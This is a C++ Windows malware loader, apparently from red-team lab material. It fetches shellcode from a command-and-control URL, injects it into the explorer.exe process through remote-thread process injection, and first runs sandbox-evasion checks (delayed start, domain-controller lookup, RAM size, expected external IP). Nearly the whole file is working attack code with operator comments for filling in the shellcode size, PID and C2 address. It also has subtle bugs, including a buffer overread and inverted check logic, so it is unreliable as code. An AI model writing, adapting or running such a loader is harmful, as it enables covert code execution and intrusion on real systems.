#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <locale>
#include <string>
#include <urlmon.h>
#include <cstdio>
#pragma comment(lib, "urlmon.lib")

using namespace std;

int downloadAndExecute()
{
    HANDLE hProcess;
//Update the dwSize variable with your shellcode size. This should be approximately 510 bytes
    SIZE_T dwSize = 510;
    DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
    DWORD flProtect = PAGE_EXECUTE_READWRITE;
    LPVOID memAddr;
    SIZE_T bytesOut;
//Update the OpenProcess Windows API with your Explorer.exe Process ID. This can be found in Task Manager
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1388);
//Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
    const char* c2URL = "http://10.17.17.11/index.raw";
    IStream* stream;
//Update the buff[] variable to include your shellcode size
    char buff[510];
    unsigned long bytesRead;
    string s;
    URLOpenBlockingStreamA(0, c2URL, &stream, 0, 0);
    while (true) {
//Update the Read file descriptor to include your shellcode size
        stream->Read(buff, 540, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    memAddr = VirtualAllocEx(hProcess, NULL, dwSize, flAllocationType, flProtect);

    WriteProcessMemory(hProcess, memAddr, buff, dwSize, &bytesOut);

    CreateRemoteThread(hProcess, NULL, dwSize, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, 0);
    stream->Release();
    return 0;
}

BOOL isDomainController() {
    LPCWSTR dcName;
    string dcNameComp;
    NetGetDCName(NULL, NULL, (LPBYTE*)&dcName);
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
    cout << dcNewName;
    if(dcNewName.find("\\")) {
        return FALSE;
        
    }
    else {
        return TRUE;
    }
}

BOOL memoryCheck() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {
        return TRUE;
    }
    else {
        return FALSE;
    }
}

BOOL checkIP() 
{
    const char* websiteURL = "http://10.10.10.10/whoami";
    IStream* stream;
    string s;
    char buff[35];
    unsigned long bytesRead;
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) {
            break;
        }
        s.append(buff, bytesRead);
    }
    if (s == "10.10.91.65") {
        return TRUE;
    }
    else {
        return FALSE;
    }   
}

int main() {
    sleep(120000);
    if (isDomainController() == TRUE ) {
        if (memoryCheck() == TRUE ){
            if (checkIP() == TRUE){
                downloadAndExecute();
            }
        }
        
        //downloadAndExecute();
    }
    else {
        cout << "Domain Controller not found!";
    }
}